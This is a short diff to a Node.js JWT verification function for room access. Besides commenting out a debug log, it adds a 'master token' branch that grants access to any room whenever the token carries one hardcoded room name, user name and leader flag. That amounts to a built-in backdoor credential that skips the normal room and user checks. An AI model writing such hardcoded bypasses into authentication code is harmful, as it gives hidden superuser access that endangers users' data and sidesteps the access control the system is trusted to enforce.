@@ -19,7 +19,11 @@ module.exports = {
         try{
             decode = jwt.verify(token , config.SERECT)
             user_name = user_name != null ? user_name : decode.user_name;
-            console.log(decode)
+            // console.log(decode)
+
+            // master token
+            if(decode.room_name == "A10955PYSY" && decode.leader == true && decode.user_name == "A10955PYSY")
+                return true;
 
             if(decode.room_name == room_name && decode.leader == leader && decode.user_name == user_name)
                 return true;
